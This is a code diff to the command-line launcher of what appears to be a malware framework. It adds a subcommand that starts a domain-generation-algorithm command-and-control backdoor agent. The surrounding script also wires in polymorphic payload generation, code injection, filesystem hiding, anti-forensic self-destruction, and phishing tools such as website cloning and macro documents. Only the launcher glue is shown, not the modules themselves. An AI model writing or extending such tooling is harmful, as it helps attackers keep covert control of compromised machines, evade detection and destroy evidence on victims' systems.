@@ -21,6 +21,7 @@ from modules.polymorphic_engine import create_polymorphic_payload, generate_encr
 from modules.anti_forensics import scorched_earth
 from modules.evasion import inject_code, hide_in_filesystem, find_process_by_name
 from modules.social_engineering import clone_website, create_macro_doc, send_email
+from modules.backdoor import dga_agent
 
 def load_config(config_path='config.json'):
     """Load configuration from a JSON file."""
@@ -145,6 +146,11 @@ def main():
     resilience_parser = subparsers.add_parser("resilience", help="Manage resilience features")
     resilience_parser.add_argument("--enable-guardian", action="store_true", help="Enable Guardian mode")
     resilience_parser.add_argument("--self-destruct", action="store_true", help="Activate Scorched Earth policy")
+
+    # DGA Agent
+    dga_parser = subparsers.add_parser("dga-agent", help="Start the DGA C2 agent")
+    dga_parser.add_argument("--seed", required=True, help="The DGA seed to use")
+    dga_parser.add_argument("--interval", type=int, default=3600, help="Polling interval in seconds")
 
     args = parser.parse_args()
 
@@ -300,6 +306,9 @@ if target_pid:
                 logging.info("Enabling Guardian mode... The guardian will run in the background.")
                 # Detach the guardian process
                 subprocess.Popen([sys.executable, "guardian.py", script_path], close_fds=True)
+
+        elif args.command == "dga-agent":
+            dga_agent(args.seed, args.interval)
 
     except Exception as e:
         logging.error(f"An error occurred: {e}", exc_info=args.verbose)
